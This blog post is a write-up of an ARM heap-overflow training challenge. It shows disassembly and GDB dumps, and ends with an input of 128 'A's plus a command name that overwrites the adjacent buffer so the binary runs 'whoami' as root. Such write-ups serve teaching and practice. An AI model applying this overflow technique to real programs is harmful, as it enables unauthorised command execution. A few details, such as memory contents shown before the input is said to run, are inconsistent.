---
layout: post
title: "Basic Heap Overflow"
---

## Intro
I finally had some time to get back to Billy's ARM exploitation challenges found on his <a href="https://github.com/Billy-Ellis/Exploit-Challenges">github</a>. Until now, I have only really focused on the stack based vulnerabilities so I wanted to try some of his Heap based challenges. This post covers my approach to completing his 'Heap Level 1' challenge.

## The Challenge:
The first Heap challenge that he released contained a very simple heap overflow vulnerability that allows the execution of a custom system command. The following output is produced from executing the binary:

```
Garys-iPhone:/lab/rop root# ./heaplevel1 
Usage: ./heaplevel1 <username>
```

From above, we can see that the binary takes a single argument; the username. Executing the binary with a specified username executes additional code and produces different output:

```
Garys-iPhone:/lab/rop root# ./heaplevel1 test
Welcome to heaplevel1, created by @bellis1000
User: test is executing command "date"
Sun Feb 24 01:48:27 GMT 2019
```

## Inspecting the Binary
To see what's going on inside the binary, we can make use of a disassembler, for this step I used Hopper, but other tools will help accomplish the same.

Looking at the following code, we can see there are two malloc functions. As this binary was compiled for the ARM architecture, we can picture the malloc() functions and the values used within their parameters. 

``` void *malloc(size_t size) ```

In ARM, the R1 register is used to hold the value of the first parameter of a function, so from the following code we can see that the value '0x80' is moved into R1 before the malloc() function is called.

```
0000be4c         movw       r1, #0x80
0000be50         str        r0, [sp, #0x30 + var_1C]
0000be54         mov        r0, r1
0000be58         bl         imp___symbolstub1__malloc
0000be5c         movw       r1, #0x80
0000be60         str        r0, [r7, #-0x10]
0000be64         mov        r0, r1
0000be68         bl         imp___symbolstub1__malloc
```

0x80 in decimal is 128, so we know that both malloc calls pass the decimal value of 128 in as a parameter and allocate 128 bytes of heap memory.

``` malloc(128); ```

Based on the two call's occuring one after the other, both allocations will likely be next to each other within memory however we can dig deeper into this at runtime using GDB. Before we do this, there are a few more things we can do to help make our debugging a little smoother. The following list holds some points that we need to keep in mind whilst stepping through each instruction:

* 1st malloc() -> 0xbe58
* 2nd malloc() -> 0xbe68
* 1st strcpy() -> 0xbe80, loads 'date' system call into the 1st heap buffer
* 2nd strcpy() -> 0xbea0, loads the username into the 2nd heap buffer
* printf() -> 0xbec4, prints the username and target system call to use

## Runtime analysis:
Breakpoint 0xbec4
Run to it, dump registers. See that r1 is the init'd string, r2 is the username and r3 is the system call.

```
(gdb) c
Continuing.
Welcome to heaplevel1, created by @bellis1000

Breakpoint 2, 0x0000bec4 in main ()
(gdb) i r
r0             0xbfbd	49085
r1             0x14b010	1355792
r2             0x14b090	1355920
r3             0x14b090	1355920
r4             0x0	0
r5             0x0	0
r6             0x0	0
r7             0x27dff758	668989272
r8             0x27dff75c	668989276
r9             0x3a80ce30	981519920
r10            0x0	0
r11            0x0	0
r12            0x14b091	1355921
sp             0x27dff728	668989224
lr             0x38a63ddf	950418911
pc             0xbec4	48836
```

View the addresses the r1, r2 and r3 to picture the printed output.

```
(gdb) x/w 0xbfbd
0xbfbd:  "\033[36mUser: %s is executing command \"%s\"\n"
(gdb) x/w 0x14b010
0x14b010:  'A' <repeats 128 times>
(gdb) x/2w 0x14b010
0x14b010:  'A' <repeats 128 times>
0x14b091:  "ate"
```

Run it again with 128 A's and 4 B's.

```
Welcome to heaplevel1, created by @bellis1000
User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB is executing command "BBBB"
sh: BBBB: command not found
```

We now know that the BBBB overwrites the value stored in the address that is used during the execution of the system command.
Minus the r2 addr from r3 addr == 128 bytes, proof that the heap allocs are next to each other.

128 A's with 'whoami' == overflow into code exec

```
Breakpoint 2, 0x0000bec4 in main ()
(gdb) i r
r0             0xbfbd	49085
r1             0x155c20	1399840
r2             0x155ca0	1399968
r3             0x155ca0	1399968
```

```
(gdb) x/10w 0x155c20
0x155c20:  'A' <repeats 128 times>, "whoami"
```

```
(gdb) c
Continuing.
User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwhoami is executing command "whoami"
root
```

## Conclusion and my thoughts:


I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter.

Thanks for reading.

